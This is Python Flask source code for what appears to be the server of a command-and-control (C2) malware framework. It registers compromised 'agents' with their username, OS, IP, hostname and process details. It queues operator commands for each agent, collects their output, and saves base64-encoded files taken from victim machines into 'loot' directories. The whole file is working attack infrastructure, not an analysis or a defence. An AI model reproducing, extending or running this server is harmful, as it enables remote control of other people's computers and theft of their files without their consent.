


from flask import Flask, request, jsonify
from Config import Config
from app.Assest.Command import CommandFinal
from flask_cors import CORS, cross_origin
from datetime import datetime
from sqlalchemy import delete
from sqlalchemy.ext.declarative import DeclarativeMeta
from app.Assest.Loot import loot
from app.Assest.time import time
from app.model.model import db
from app.model.model import Agent, Command

import json
import os
import base64
    # def calcTime(self):

   
class AlchemyEncoder(json.JSONEncoder):

    def default(self, obj):
        if isinstance(obj.__class__, DeclarativeMeta):
            # an SQLAlchemy class
            fields = {}
            for field in [x for x in dir(obj) if not x.startswith('_') and x != 'metadata']:
                data = obj.__getattribute__(field)
                try:
                    json.dumps(data) # this will fail on non-encodable values, like other classes
                    fields[field] = data
                except TypeError:
                    fields[field] = None
            # a json-encodable dict
            return fields

        return json.JSONEncoder.default(self, obj)
    
class App():
    def __init__(self, ip, port, lootdir, lootdirbackup):
        self.ip = ip
        self.port = port
        self.lootdir = lootdir

        self.lootdirbackup = lootdirbackup
        self.create_app()

    def checkBD(self):
        import os
        file_path = Config.SQLALCHEMY_DATABASE_URI

        if os.path.exists(file_path):
            return True
        else:
            return False

    def dict_helper(objlist):
        result2 = [item.obj_to_dict() for item in objlist]
        return result2

    def create_app(self, config_class = Config):
        print("[+] Starting Flask server")
        app = Flask(__name__)

        CORS(app, support_credentials=True)

        app.config.from_object(config_class)

        db.init_app(app)

        if self.checkBD() != True: # Check if Database file exists if not create it
            with app.app_context():
                db.create_all()
                db.session.commit()
                # print(app.app_context())

        @app.route("/add/<uid>", methods=["POST", "GET"])
        def add(uid):
            data = request.get_json()
            print(f"""
\n--------------------
UID -- {uid}
Hardware:
    -- Username: {data["username"]}
    -- UID: {uid}
    -- PLatform: {data["OS"]}
    -- System Language: {data["systemlan"]}
Process:
    -- Process Name: {data["procname"]}
    -- Process ID: {data["pid"]}
IP:
    -- Hostname: {data["hostname"]}
    -- IP Address: {data["IP"]}
--------------------""")
            agent = Agent.query.filter_by(uid=uid).first()
            c = Command.query.filter_by(target_uid=uid, command_response="Loading..").all()

            if agent:
                agent.interaction = time()
                db.session.commit()
                print(f"[+] Updated {agent.interaction} to {time()}")
            else:
                print(f"[+] Added {uid} to database")
                agent_add = Agent(
                        username=data["username"],
                        os=data["OS"],
                        ram=data["ram"],
                        interaction=time(),
                        pid=data["pid"],
                        procname=data["procname"],
                        hostname=data["hostname"],
                        syslan=data["systemlan"],
                        ip=data["IP"],
                        uid=uid)


                db.session.add(agent_add)
                db.session.commit()


            Agent1 = Agent.query.all()

            # print(json.dumps(c, cls=AlchemyEncoder))
            response = jsonify(json.dumps(c, cls=AlchemyEncoder))
            # print(f"response: {response}")
            # response.headers.add('Access-Control-Allow-Origin', '*')
            return response

        @app.route("/command/<id>/<uid>/report", methods=["POST", "GET"])
        def report(id, uid):
            print(f"[{uid}] Processing Command {id} ")

            agent = Agent.query.filter_by(uid=uid).first() # Retrieve client info by using the uid to get the process name
            procname = agent.procname.replace(".exe", "")
            
            # print(procname)

            data = request.get_json()
            command = data["command"]
            if data["command"].startswith("hihib64FileEncodedUselessPieceOfStringHihi"): #Response is indeed base64

                b64 = command.replace("hihib64FileEncodedUselessPieceOfStringHihi", "")
                command = data["command"].replace("hihib64FileEncodedUselessPieceOfStringHihi", f"Success full recieved b64 -> {b64}")
                commands = Command.query.filter_by(id=id).first() # Retrieve filename form database
                print(f"[{uid}] Received an file -> {commands.command}")

                if commands:
                    filename=commands.command

                if self.lootdir != self.lootdirbackup:
                    print(f"[{uid}] Used lootdir{self.lootdir}{uid}FN{filename}")
                    with open(f"{self.lootdir}{uid}FN{filename}","wb+") as F:
                        print(f"[{uid}] Copying File to {self.lootdir}")
                        F.write(base64.b64decode(b64))
                        F.close()
                    if os.path.exists(self.lootdirbackup):
                        print(f"[{uid}] Copying File to {self.lootdirbackup}")
                        with open(f"{self.lootdirbackup}{uid}FN{filename}","wb+") as F:
                            F.write(base64.b64decode(b64))
                            F.close()
                            print(f"[{uid}] Succesfully wrote {filename}")
                else:
                    print(f"[{uid}] Used {self.lootdir}")
                    with open(f"{self.lootdir}{uid}FN{filename}","wb+") as F:
                        F.write(base64.b64decode(b64))
                        F.close()
                        print(f"[{uid}] Successfully wrote {filename}")
            elif procname in data["command"] and agent.pid in data["command"]:
                command = data["command"].replace(procname, f"{procname} <---------------------------------- you")



            commandid = Command.query.filter_by(id=id).first()

            commandid.command_response = command

            commandid.command_executed = time()

            db.session.commit()

            print(f"[+] Command {commandid.id} got an response")
            return jsonify("Goodjob sir!")

        @app.route("/agents", methods=['GET'])
        def returnAgents():

            c = Agent.query.all()
            # if c:
            #     for cis in c:
            #         print(cis.username)
            # print(c)
            # print(json.dumps(c, cls=AlchemyEncoder))
            response = jsonify(json.dumps(c, cls=AlchemyEncoder))
            # print(f"response: {response}")
            response.headers.add('Access-Control-Allow-Origin', '*')
            return response

        @app.route("/command/<uid>", methods=["POST", "GET", "OPTIONS"])
        def returnCcommands(uid):
            c = Command.query.filter_by(target_uid=uid).all()

            # print(json.dumps(c, cls=AlchemyEncoder))
            response = jsonify(json.dumps(c, cls=AlchemyEncoder))
            # print(f"response: {response}")
            response.headers.add('Access-Control-Allow-Origin', '*')
            return response 

        @app.route("/loot/info", methods=["get"])
        def lootofpc():
            print(f"[+] Loading files in Loot..")
            return jsonify(json.dumps(loot("../UI/tiran/public/loot")))
        
        @app.route("/command/add/<uid>",  methods=["POST", "GET", "OPTIONS"])
        @cross_origin(supports_credentials=True)
        def addCommand(uid):
            data = request.get_json() # Request json data

            agent = Agent.query.filter_by(uid=uid).first()

            # print(data)

            CommandFinal(uid, data["command"], time(), agent.pid, agent.procname)
            # print(f"""
            # command: {data["command"]}
            # uidl {uid}
            
            # """)
            
            if data["command"] == "remove":
                command = Agent.query.filter_by(uid=uid).delete()
                # db.session.add(command)
                db.session.commit()
                                
            response = jsonify(f'Successfull added to DB') # Message to return in UI
            # response.headers.add('Access-Control-Allow-Origin', '*')
            # print(response)
            print(f"[{uid}] Added {data['command']}")
            return response# Return earlierer defined message
        
        app.run(host=self.ip, port=self.port)

        return app

    # create_app()